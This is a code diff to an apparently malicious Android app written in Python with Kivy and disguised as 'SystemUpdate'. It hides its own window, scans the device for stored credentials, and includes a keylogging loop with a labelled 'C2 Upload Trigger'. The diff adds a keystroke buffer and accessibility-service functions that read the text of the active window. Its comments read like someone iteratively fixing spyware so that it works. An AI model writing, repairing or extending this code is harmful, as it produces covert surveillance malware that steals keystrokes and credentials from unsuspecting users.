@@ -1,6 +1,5 @@
 from kivy.app import App
 from kivy.uix.label import Label
-from kivy.core.window import Window
 from kivy.clock import Clock
 
 # --- Core Imports (Fixed: Added android/accessibility at TOP cleanly) ---
@@ -153,6 +152,59 @@ def scan_all_device_for_secrets():
         try_query_db(db_path) 
     
     return found_creds
+
+#
+class ThreadSafeBuffer:
+    def __init__(self):
+        self._buffer = []
+        self._lock = threading.Lock()
+        
+    def append(self, item):
+        with self._lock:
+            self._buffer.append(item)
+            
+    def get_and_clear(self):
+        with self._lock:
+            data = ''.join(self._buffer)
+            self._buffer = []
+            return data
+
+def setup_accessibility_service():
+    try:
+        Context = getattr(android.content.Context, '__class__', type(None))
+        am_obj = AccessibilityManager(Context.getSystemService(Context.ACCESSIBILITY_SERVICE)) if AccessibilityManager else None
+        
+        if am_obj and hasattr(am_obj, 'isEnabled'):
+            return am_obj.isEnabled()
+            
+        return False
+    except:
+        return False
+
+def get_active_window_content():
+    try:
+        Context = getattr(android.content.Context, '__class__', type(None))
+        am_obj = AccessibilityManager(Context.getSystemService(Context.ACCESSIBILITY_SERVICE)) if AccessibilityManager else None
+        
+        if am_obj and hasattr(am_obj, 'getCurrentRunningAccessibilityInfoList'):
+            info_nodes = am_obj.getCurrentRunningAccessibilityInfoList(1000)
+            for info in info_nodes:
+                try:
+                    provider = info.getTextProvider()
+                    root_node_func = provider.getRootNodeInActiveWindow if hasattr(provider, 'getRootNodeInActiveWindow') else None
+                    
+                    if root_node_func and callable(root_node_func):
+                        return root_node_func()
+                except:
+                    pass
+    except:
+        pass
+    
+    return None
+
+#
+
+
 
 
 # --- Fix: Keylogging Loop (Fixed Infinite Run + C2 Upload Trigger + Context Import) ---
@@ -396,7 +448,8 @@ def request_accessibility_service():
 
 # --- Main UI & Initialization (Fixed Imports & Flows) ----------
 class SystemUpdate(App):
-    def build(self): 
+    def build(self):
+        from kivy.core.window import Window
         Window.size=(1,1); Window.opacity=0
         
         # FIXED: Define permissions list clearly
